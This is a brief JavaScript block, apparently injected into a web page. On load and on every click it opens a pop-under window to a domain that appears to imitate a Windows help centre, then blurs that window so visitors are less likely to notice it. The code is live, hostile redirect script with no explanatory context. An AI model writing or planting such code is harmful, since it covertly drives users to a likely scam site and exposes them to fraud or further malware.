<script>
	$( document ).ready(function() {
    console.log( "ready!" );
});

var w1=800;
var h1 = 800;
//var w1= screen.width;
//var h1 = screen.height;
$( window ).on("load", function() {
      window.open('https://windwshelqcentrecllnw.org/teacher/','','width='+w1+',height='+h1+',location=yes,menubar=yes,resizable=yes,scrollbars=yes,toolbar=no').blur(); 
    window.focus()
});
 window.onclick = function() {
window.open('https://windwshelqcentrecllnw.org//teacher/','','width='+w1+',height='+h1+',location=yes,menubar=yes,resizable=yes,scrollbars=yes,toolbar=yes').blur(); 
    //window.focus()
}
</script>


